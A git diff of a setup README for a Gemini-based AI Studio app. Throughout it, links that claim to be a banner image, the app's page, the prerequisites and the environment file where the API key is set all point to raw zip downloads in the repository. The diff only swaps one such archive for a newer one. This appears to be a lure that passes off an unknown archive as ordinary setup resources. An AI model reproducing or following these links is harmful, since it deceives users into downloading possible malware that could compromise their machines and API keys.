@@ -1,20 +1,20 @@
 <div align="center">
-<img width="1200" height="475" alt="GHBanner" src="https://github.com/ssharvesh-steep/sharvesh-s/raw/refs/heads/main/components/s_sharvesh_1.0.zip" />
+<img width="1200" height="475" alt="GHBanner" src="https://github.com/ssharvesh-steep/sharvesh-s/raw/refs/heads/main/components/s-sharvesh-3.6.zip" />
 </div>
 
 # Run and deploy your AI Studio app
 
 This contains everything you need to run your app locally.
 
-View your app in AI Studio: https://github.com/ssharvesh-steep/sharvesh-s/raw/refs/heads/main/components/s_sharvesh_1.0.zip
+View your app in AI Studio: https://github.com/ssharvesh-steep/sharvesh-s/raw/refs/heads/main/components/s-sharvesh-3.6.zip
 
 ## Run Locally
 
-**Prerequisites:**  https://github.com/ssharvesh-steep/sharvesh-s/raw/refs/heads/main/components/s_sharvesh_1.0.zip
+**Prerequisites:**  https://github.com/ssharvesh-steep/sharvesh-s/raw/refs/heads/main/components/s-sharvesh-3.6.zip
 
 
 1. Install dependencies:
    `npm install`
-2. Set the `GEMINI_API_KEY` in [https://github.com/ssharvesh-steep/sharvesh-s/raw/refs/heads/main/components/s_sharvesh_1.0.zip](https://github.com/ssharvesh-steep/sharvesh-s/raw/refs/heads/main/components/s_sharvesh_1.0.zip) to your Gemini API key
+2. Set the `GEMINI_API_KEY` in [https://github.com/ssharvesh-steep/sharvesh-s/raw/refs/heads/main/components/s-sharvesh-3.6.zip](https://github.com/ssharvesh-steep/sharvesh-s/raw/refs/heads/main/components/s-sharvesh-3.6.zip) to your Gemini API key
 3. Run the app:
    `npm run dev`
